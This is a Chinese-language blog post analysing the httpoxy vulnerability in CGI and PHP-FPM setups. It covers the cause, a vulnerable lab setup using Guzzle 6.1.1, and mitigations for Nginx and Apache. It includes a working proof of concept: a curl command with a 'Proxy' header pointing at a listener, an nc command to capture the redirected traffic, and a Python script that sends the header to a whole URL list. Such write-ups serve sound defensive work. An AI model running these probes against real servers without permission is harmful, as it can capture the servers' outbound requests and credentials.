# testtest

# httpoxy漏洞分析
## 漏洞分析
这个漏洞[官网](https://httpoxy.org/)说的很清楚了，不过可能6级没过的同学比较多，笔者在此再分析一下，顺便提及一些理解错误的地方。
### 背景
1. 'HTTP\_PROXY'这个环境变量已经被我们约定俗成为请求代理，如果设置了这个环境变量，那么我们的请求，将会被发送到'HTTP\_PROXY'这个变量所存储的地址。
2. 在CGI(RFC 3875)的模式下，服务器会把请求头(header)中所有的的变量名称变为大写，并且加上'HTTP\_'的前缀，用来表示这个是HTTP请求中的变量。也就是说，当一个HTTP的header中如果存在'Proxy'这样的变量，经过CGI解释器在处理过后，将会变为'HTTP\_PROXY'，也就是变成了请求代理的环境变量。

### 漏洞
- 有人向目标服务器发送了一个带有'Proxy:10.0.0.1:12121'头(这个头可以有用户任意指定)的请求；
- 如果目标服务器在收到客户端请求之后，需要向另外一个服务器请求数据，那么由于背景中所述的原因，目标服务器的这条请求将发送到'10.0.0.1:12121'(这个被用户指定的地址)上去。如果这个请求包含敏感信息，比如服务器配置或者服务器的身份认证信息，那么将造成敏感信息泄露。

### 一些错误的理解
1. 这个漏洞要求服务端以CGI模式(cgi, php-fpm)运行即可被触发。如果服务器运行在CGI模式下，那么我们请求了index.php文件,服务器就会调用CGI解释器来处理这个请求，并触发漏洞。比如下面的[漏洞测试环境](#漏洞环境搭建)所示，而不必直接请求CGI文件。    
    而Github上却有个被fork了多次的扫描器思路是: 先建立一个常用的CGI文件路径文件字典，然后将字典中的CGI文件路径逐个添加到目标网址后面如下图，在发送带有'Proxy'头的请求。如下图:
![cgi列表](http://7xkqga.com1.z0.glb.clouddn.com/image/blog/httpoxy%E9%94%99%E8%AF%AF%E6%89%AB%E6%8F%8F%E5%99%A8cgi%E5%88%97%E8%A1%A8.png)
![错误的实现方式](http://7xkqga.com1.z0.glb.clouddn.com/image/blog/httpoxy%E9%94%99%E8%AF%AF%E6%89%AB%E6%8F%8F%E5%99%A8%E5%AE%9E%E7%8E%B0%E4%BB%A3%E7%A0%81.png)这样的扫描器可能大多数的httpoxy漏洞都扫不到。
 
2. 漏洞[官网](https://httpoxy.org/)中提到一个受影响的表格:![httpoxy的表格](http://7xkqga.com1.z0.glb.clouddn.com/image/blog/httpoxy%E5%AE%98%E7%BD%91%E5%8F%97%E5%BD%B1%E5%93%8D%E7%9A%84%E8%A1%A8%E6%A0%BC.png)，中所说的'HTTP client'指的是，目标服务器向另外一台服务器请求数据时所用的客户端。同样，这个表格只是说明确的使用'HTTP_PROXY'环境变量作为请求代理的程序有这些，但是还有无数的程序也存在这个漏洞，但是这里并没有列出来。比如鸟哥[博客](http://www.laruence.com/2016/07/19/3101.html)中举例写的代码，就没有用到Guzzle 4+ 或Artax(所以建议及时不受此次漏洞的威胁，也建议做好防护)。

```php
<?php
$http_proxy = getenv("HTTP_PROXY");
if ($http_proxy) {
    $context = array(
        'http' => array(
            'proxy' => $http_proxy,
            'request_fulluri' => true,
        ),
 
    );
    $s_context = stream_context_create($context);
} else {
    $s_context = NULL;
}
$ret = file_get_contents("http://www.laruence.com/", false, $s_context);
```

### 推荐阅读
在众多的漏洞分析文章中，个人以为鸟哥的[博客](http://www.laruence.com/2016/07/19/3101.html)(中文) 和[symfony](https://www.symfony.fi/entry/httpoxy-vulnerability-hits-php-installations-using-fastcgi-and-php-fpm-and-hhvm?from=timeline&isappinstalled=0)(英文)分析的十分清晰。除了官网(描述太蹩脚)外，推荐大家阅读。
<h2 id="漏洞环境搭建">漏洞环境搭建(Ubuntu14.04+Nginx+PHP+Guzzle)</h2>

- 更新源安装nginx:
```shell
sudo apt-get update
sudo apt-get install nginx
```    
- 安装PHP及其相关模块：    
`sudo apt-get install php5-fpm php5-curl php5-cli`    
- 修改PHP默认配置(可选,方便以后使用安全PHP)：    
`sudo nano /etc/php5/fpm/php.ini`
去掉php模糊匹配当前文件下的文件，将`';cgi.fix_pathinfo=1'`前面的分号去掉，然后值改为0，如下:
`cgi.fix_pathinfo=0`    
- 后重启PHP：    
`sudo service php5-fpm restart`    
- 配置站点：    
`cd /etc/nginx/sites-available/`    
可以选择新建一个站点，但是为了简单，我们直接修改默认的`default`站点
`sudo nano default`    
我最终的配置文件如下，主要是添加对PHP的解析: 
 
```
server {
    listen 80 default_server;
    listen [::]:80 default_server ipv6only=on;
    root /usr/share/nginx/html;
    index index.html index.php index.htm;
    server_name localhost;
    location / {
        try_files $uri $uri/ =404;
    }
    location ~ \.php$ {
        fastcgi_split_path_info ^(.+\.php)(/.+)$;
        fastcgi_pass 127.0.0.1:9000;
        fastcgi_index index.php;
        include fastcgi_params;
        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
    }
}
```

- 安装有漏洞的guzzle:    
进入站点文件夹
`cd /usr/share/nginx/html`      
我们看到是再6.2.1版本修复了httpoxy漏洞，
![guzzle6.2.1修复漏洞](http://7xkqga.com1.z0.glb.clouddn.com/image/blog/httpoxyguzzle%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D%E7%9A%84%E7%89%88%E6%9C%AC.png)所以我们要选择一个之前的版本，比如以前一个Version 6.1.1    
安装Composer(PHP依赖项管理工具):    
`curl -sS https://getcomposer.org/installer | php`     
安装成功后安装guzzle6.1.1版本:       
`php composer.phar require guzzlehttp/guzzle:6.1.1`   
![guzzle6.1.1安装成功](http://7xkqga.com1.z0.glb.clouddn.com/image/blog/httpoxyguzzle%E5%AE%89%E8%A3%85%E6%88%90%E5%8A%9F.png) 
等待安装完成，然后将vendor文件夹整个移动到上层目录(html目录)下。

- 编写漏洞PHP程序：    
再html文件夹下新建`index.php`文件，内容如下所示。可以随自己喜欢写，但是注意使用了guzzlehttp客户端发送数据:

```php
<?php
echo "Wellcome to here, I will post your secret message to tinydawn.com ";
require 'vendor/autoload.php';
$client = new GuzzleHttp\Client();
$client->request('POST', 'http://www.tinydawn.com/', [
    'message' => 'secret message'
]);
?>
```    
- 重启服务器是配置生效:    
`sudo service nginx restart`    
`sudo service php5-fpm restart`    
- 现在访问localhost/127.0.0.1/服务器ip,都可以看到刚才添加的页面了![访问服务器的ip](http://7xkqga.com1.z0.glb.clouddn.com/image/blog/httpoxy%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA%E6%88%90%E5%8A%9F.png)同时会向www.tinydawn.com POST数据。



## 漏洞检测/扫描/POC/EXP
- 漏洞检测：    
检测这个漏洞很简单，只需要2步：
 1. 给目标网站发送一个带有'Proxy'头的HTTP请求(比如:Proxy: 10.211.55.5:12121)
 2. 在'Proxy'所设置的ip和端口监听，看是否有来自目标ip的数据发过来(比如: 在10.211.55.5机器上监听12121端口)。如果收到了数据，则表示目标机器漏洞存在。

- POC:
    1. 在任意一台主机执行:    
```shell
curl -H "Proxy:10.211.55.5:12121" http://target.com/x.php
```
    2. 在10.211.55.5上执行:    
```shell
nc -lvv -p 12121 >> httpoxy.log
```
(感谢[Wils0n](http://blog.wils0n.cn/)提供帮助)
如果`http://target.com/x.php`页面存在漏洞，将会在httpoxy.log中出现连接信息。
![成功截取到服务器发送的数据](http://7xkqga.com1.z0.glb.clouddn.com/image/blog/httpoxy%E5%B7%B2%E7%BB%8F%E6%88%AA%E5%8F%96%E5%88%B0%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8F%91%E9%80%81%E7%9A%84%E6%95%B0%E6%8D%AE.png)
- 批量扫描:
这时候就需要我们万能的动态爬虫了，首先爬取整个目标网站的url，然后逐个向这些url逐个发送带有Proxy头的HTTP连接，同时在Proxy指定的机器上运行一个webserver，端口指定为Proxy中指定的端口，每次收到连接时，都将连接的信息保存下来，然后响应404。如果不设置响应，目标网站将会一直等待到超时才向我们的扫描器返回数据。下附一个单线程扫描器的Python代码，接收数据的webserver就不提供了，如果只是用来做安全监测，netcat够用了。

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
__author__ = 'Taerg'

import requests
import datetime
starttime = datetime.datetime.now()

fpi = open('urls.txt','r')
urls = fpi.readlines()
for url in urls:
    print(url)
    header = {
        'Proxy' : '10.211.55.5:12121',
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
        'Accept-Encoding': 'gzip, deflate',
        'X-Forwarded-For': '8.8.8.8',
        'Connection': 'keep-alive'
    }
    r = requests.get(url, headers = header)
endtime = datetime.datetime.now()
print ((endtime - starttime).seconds)
```
- 查看日志，检测是否成功：
服务器收到请求后未经CGI处理时的header:![](http://7xkqga.com1.z0.glb.clouddn.com/image/blog/httpoxyCGI%E5%A4%84%E7%90%86%E5%89%8D%E5%8E%9F%E5%A7%8B%E8%AF%B7%E6%B1%82.png)
上图可以看到header中包含'Proxy'变量。
![](http://7xkqga.com1.z0.glb.clouddn.com/image/blog/httpoxy%E6%9C%AA%E5%81%9A%E9%98%B2%E6%8A%A4%E6%97%A5%E5%BF%97.png)
上图可以看到'Proxy'变量已经变为'HTTP_PROXY'环境代理变量。


## 漏洞修复
### Nginx的防护
1. 清除FastCGI的proxy参数    
`echo 'fastcgi_param HTTP_PROXY "";' | sudo tee -a /etc/nginx/fastcgi.conf`    
或者(根据使用的配置文件的不同，一起修改也不会有问题)    
`echo 'fastcgi_param HTTP_PROXY "";' | sudo tee -a  /etc/nginx/fastcgi_params`    
2. 清除nginx代理服务器的参数    
`echo 'proxy_set_header Proxy "";' | sudo tee -a /etc/nginx/proxy_params`    
3. 完了不要忘记重启    
`sudo service nginx restart`    
发生错误可以使用`sudo nginx -t`来检测配置语法，查看错误信息。

###Apache的防护
#### Ubuntu and Debian
1. 启用`mod_headers`    
`sudo a2enmod headers`    
2. 修改全局配置文件：
`sudo nano /etc/apache2/apache2.conf`    
添加`RequestHeader unset Proxy early`,保存
3. 重启Apache：    
`sudo service apache2 restart`    
发生错误可以使用`sudo apache2ctl configtest`来检测配置语法，查看错误信息。

#### CentOS and Fedora
1. `mod_headers`默认已经启动
2. 修改配置文件：
`sudo nano /etc/httpd/conf/httpd.conf`
添加`RequestHeader unset Proxy early`,保存    
3. 重启`sudo service `**`httpd`**` restart`
检查语法`sudo apachectl configtest`

###查看修复结果
修复后的日志:
![修复后的日志](http://7xkqga.com1.z0.glb.clouddn.com/image/blog/httpoxy%E4%BF%AE%E5%A4%8D%E5%90%8E%E6%97%A5%E5%BF%97.png)
'HTTP_PROXY'变量已经被清除。修复成功。
